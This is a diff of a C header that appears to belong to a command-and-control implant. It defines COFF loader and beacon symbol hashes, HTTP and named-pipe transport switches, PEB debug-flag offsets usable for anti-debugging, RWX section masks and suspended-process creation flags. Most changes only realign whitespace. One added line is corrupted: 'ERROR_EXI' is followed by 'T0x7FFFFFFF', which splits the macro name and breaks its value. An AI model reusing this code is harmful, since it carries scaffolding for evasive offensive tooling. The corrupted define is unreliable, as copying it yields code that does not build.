@@ -121,15 +121,15 @@ s.buffer = b
 
 
 #ifdef _M_X64
-#define X64									 true
-#define IP_REG								  Rip
-#define ENTRYPOINT_REG 						 Rcx
-#define PTR_MASK                    		    0x7FFFFFFF
-#define PEB_POINTER     					    PEB_POINTER64
-#define REG_PEB_OFFSET(x) 					  REG_PEB64(x)
-#define DBG_FLAG_OFFSET 					    DBG_FLAG_OFFSET64
-#define IMAGE_OPT_MAGIC 					    IMAGE_NT_OPTIONAL_HDR64_MAGIC
-#define MACHINE_ARCH    					    IMAGE_FILE_MACHINE_AMD64
+#define X64                                     true
+#define IP_REG                                  Rip
+#define ENTRYPOINT_REG                          Rcx
+#define PTR_MASK                                0x7FFFFFFF
+#define PEB_POINTER                             PEB_POINTER64
+#define REG_PEB_OFFSET(x)                       REG_PEB64(x)
+#define DBG_FLAG_OFFSET                         DBG_FLAG_OFFSET64
+#define IMAGE_OPT_MAGIC                         IMAGE_NT_OPTIONAL_HDR64_MAGIC
+#define MACHINE_ARCH                            IMAGE_FILE_MACHINE_AMD64
 
 #define COFF_PREP_SYMBOL                        0xec6ba2a8  // __imp_
 #define COFF_PREP_SYMBOL_SIZE                   6
@@ -137,15 +137,15 @@ s.buffer = b
 #define COFF_PREP_BEACON_SIZE                   (COFF_PREP_SYMBOL_SIZE + 6)
 #define COFF_INSTANCE                           0xbfded9c9  // .refptr.__instance // TODO: update this name hash
 #elif _M_IX86
-#define X64								     false
-#define IP_REG								  Eip
-#define ENTRYPOINT_REG 						 Eax
-#define PTR_MASK                    			0x7FFF
-#define PEB_POINTER     						PEB_POINTER32
-#define REG_PEB_OFFSET(x) 					  REB_PEB32(x)
-#define DBG_FLAG_OFFSET 						DBG_FLAG_OFFSET32
-#define IMAGE_OPT_MAGIC 						IMAGE_NT_OPTIONAL_HDR32_MAGIC
-#define MACHINE_ARCH    						IMAGE_FILE_MACHINE_I386
+#define X64                                     false
+#define IP_REG                                  Eip
+#define ENTRYPOINT_REG                          Eax
+#define PTR_MASK                                0x7FFF
+#define PEB_POINTER                             PEB_POINTER32
+#define REG_PEB_OFFSET(x)                       REB_PEB32(x)
+#define DBG_FLAG_OFFSET                         DBG_FLAG_OFFSET32
+#define IMAGE_OPT_MAGIC                         IMAGE_NT_OPTIONAL_HDR32_MAGIC
+#define MACHINE_ARCH                            IMAGE_FILE_MACHINE_I386
 
 #define COFF_PREP_SYMBOL                        0x79dff807  // __imp__
 #define COFF_PREP_SYMBOL_SIZE                   7
@@ -157,36 +157,38 @@ s.buffer = b
 #ifdef TRANSPORT_HTTP
 #define TRANSPORT_TYPE 1
 #elifdef TRANSPORT_PIPE
-#   define TRANSPORT_TYPE 0
+#define TRANSPORT_TYPE 0
 #endif
 #define ROOT_NODE TRANSPORT_TYPE
 
-#define EGRESS 									 0
-#define INGRESS 									1
-#define HEAP_NO_COMMIT							  0, 0, 0, 0, 0
-#define DESKTOP_ENVIRONMENT_NULL				    0, 0, 0, 0, 0, 0, 0
-#define SMB_SID_SINGLE_WORLD_SUBAUTHORITY		   SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0
-#define SMB_RID_SINGLE_MANDATORY_LOW			    SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0
-#define PROCESS_CREATE_ALL_ACCESS_SUSPEND		   PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, nullptr, nullptr, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED
-#define IMAGE_SCN_MEM_RWX						   (IMAGE_SCN_MEM_EXECUTE |IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)
-#define IMAGE_SCN_MEM_RW						    (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)
-#define IMAGE_SCN_MEM_RX						    (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE)
-#define IMAGE_SCN_MEM_WX						    (IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)
+#define EGRESS                                      0
+#define INGRESS                                     1
+#define HEAP_NO_COMMIT                              0, 0, 0, 0, 0
+#define DESKTOP_ENVIRONMENT_NULL                    0, 0, 0, 0, 0, 0, 0
+#define SMB_SID_SINGLE_WORLD_SUBAUTHORITY           SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0
+#define SMB_RID_SINGLE_MANDATORY_LOW                SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0
+#define PROCESS_CREATE_ALL_ACCESS_SUSPEND           PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, nullptr, nullptr, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED
+#define IMAGE_SCN_MEM_RWX                           (IMAGE_SCN_MEM_EXECUTE |IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)
+#define IMAGE_SCN_MEM_RW                            (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)
+#define IMAGE_SCN_MEM_RX                            (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE)
+#define IMAGE_SCN_MEM_WX                            (IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)
 
-#define UNMANAGED_PROCESS   					    0
-#define MANAGED_PROCESS     					    1
-#define ERROR_EXIT								  0x7FFFFFFF
-#define DBG_FLAG_OFFSET64						   0x000000BC
-#define DBG_FLAG_OFFSET32						   0x00000068
-#define FLG_HEAP_ENABLE_TAIL_CHECK				  0x00000020
-#define FLG_HEAP_ENABLE_FREE_CHECK				  0x00000040
-#define FLG_HEAP_VALIDATE_PARAMETERS			    0x40000000
-#define ADDRESS_MAX 								0xFFFFFFFFFFF70000
-#define VM_MAX 									 0x70000000
+#define UNMANAGED_PROCESS                           0
+#define MANAGED_PROCESS                             1
+#define ERROR_EXI                                  T0x7FFFFFFF
+#define DBG_FLAG_OFFSET64                           0x000000BC
+#define DBG_FLAG_OFFSET32                           0x00000068
+#define FLG_HEAP_ENABLE_TAIL_CHECK                  0x00000020
+#define FLG_HEAP_ENABLE_FREE_CHECK                  0x00000040
+#define FLG_HEAP_VALIDATE_PARAMETERS                0x40000000
+#define ADDRESS_MAX                                 0xFFFFFFFFFFF70000
+#define VM_MAX                                      0x70000000
 
-#define HEADER_SIZE 							    (sizeof(uint32_t) * 3)
-#define SEGMENT_HEADER_SIZE 					    ((sizeof(uint32_t) * 6) + sizeof(uint32_t))
-#define HTTP_REQUEST_MAX 						   0x300000
+#pragma region TLV
+#define HEADER_SIZE                                 (sizeof(uint32_t) * 3)
+#define SEGMENT_HEADER_SIZE                         ((sizeof(uint32_t) * 6) + sizeof(uint32_t))
+#define HTTP_REQUEST_MAX                            0x300000
+#pragma endregion
 
 #define THREAD_CREATE_FLAGS_NONE                    0x00000000
 #define THREAD_CREATE_FLAGS_CREATE_SUSPENDED        0x00000001
@@ -196,8 +198,8 @@ s.buffer = b
 #define THREAD_CREATE_FLAGS_SKIP_LOADER_INIT        0x00000020
 #define THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE   0x00000040
 
-#define DEFAULT_SECTION_SIZE	                    0x1000
-#define DEFAULT_BUFFLEN			                 0x0400
+#define DEFAULT_SECTION_SIZE                        0x1000
+#define DEFAULT_BUFFLEN                             0x0400
 
 #ifdef TRANSPORT_PIPE
 #define MESSAGE_MAX PIPE_BUFFER_MAX
